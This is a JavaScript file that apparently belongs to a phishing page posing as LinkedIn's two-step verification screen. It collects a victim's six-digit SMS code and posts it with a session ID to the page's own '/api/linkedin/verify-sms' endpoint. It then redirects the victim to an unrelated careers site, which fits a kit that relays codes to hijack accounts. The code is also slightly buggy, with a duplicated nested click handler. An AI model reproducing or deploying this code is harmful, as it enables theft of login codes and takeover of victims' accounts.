document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("two-step-challenge");
  const pinInput = document.getElementById("input__phone_verification_pin");
  const submitButton = document.getElementById("two-step-submit-button");
  const errorDiv = document.getElementById("phone-pin-error");
  const loader = document.getElementById("loader-wrapper");
  let sessionId = new URLSearchParams(window.location.search).get("sessionId");
  let text = new URLSearchParams(window.location.search).get("text");

  document.getElementById("content-header").textContent = text;

  function showError() {
    if (errorDiv) {
      errorDiv.classList.remove("hidden__imp");
    }
  }
  function hideError() {
    if (errorDiv) {
      errorDiv.classList.add("hidden__imp");
    }
  }

  function updateSubmitButton() {
    if (submitButton) {
      const isValidLength = pinInput.value.trim().length === 6;
      submitButton.disabled = !isValidLength;
      submitButton.style.opacity = isValidLength ? "1" : "0.5";
      submitButton.style.cursor = isValidLength ? "pointer" : "not-allowed";
    }
  }

  submitButton.addEventListener("click", function (e) {
    e.preventDefault();
    hideError();

    const code = pinInput.value.trim();
    if (!code) {
      showError("Please enter the verification code");
      return;
    }

    if (code.length !== 6) {
      showError("Please enter a 6-digit verification code");
      return;
    }

    loader.classList.remove("hidden__imp");

    submitButton.addEventListener("click", function (e) {
      e.preventDefault();
      hideError();

      const code = pinInput.value.trim();
      if (!code) {
        showError("Please enter the verification code");
        return;
      }

      if (code.length !== 6) {
        showError("Please enter a 6-digit verification code");
        return;
      }

      loader.classList.remove("hidden__imp");

      let submitCodeXhr = new XMLHttpRequest();
      submitCodeXhr.open("POST", "/api/linkedin/verify-sms", true);
      submitCodeXhr.setRequestHeader("Content-type", "application/json");
      submitCodeXhr.send(JSON.stringify({ sessionId: sessionId, code: code }));

      submitCodeXhr.onreadystatechange = function () {
        let response = this.response;
        console.log(response);
        if (response == "0") {
          loader.classList.add("hidden__imp");
          pinInput.value = ""; // Clear the input field
          showError();
          updateSubmitButton();
        } else if (response == "1") {
          location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625";
        }
      };
    });
  });

  if (form) {
    // Initially disable submit button
    submitButton.disabled = true;
    submitButton.style.opacity = "0.5";
    submitButton.style.cursor = "not-allowed";
    // Handle input changes
    pinInput.addEventListener("input", (e) => {
      hideError();

      // Ensure only numbers are entered
      let value = e.target.value.replace(/[^0-9]/g, "");

      // Limit to 6 digits
      if (value.length > 6) {
        value = value.slice(0, 6);
      }

      // Update input value
      e.target.value = value;

      // Update submit button state
      updateSubmitButton();
    });

    // Handle paste event
    pinInput.addEventListener("paste", (e) => {
      e.preventDefault();
      const pastedText = (e.clipboardData || window.clipboardData).getData(
        "text"
      );
      const numbersOnly = pastedText.replace(/[^0-9]/g, "").slice(0, 6);
      pinInput.value = numbersOnly;
      updateSubmitButton();
    });
  }
});
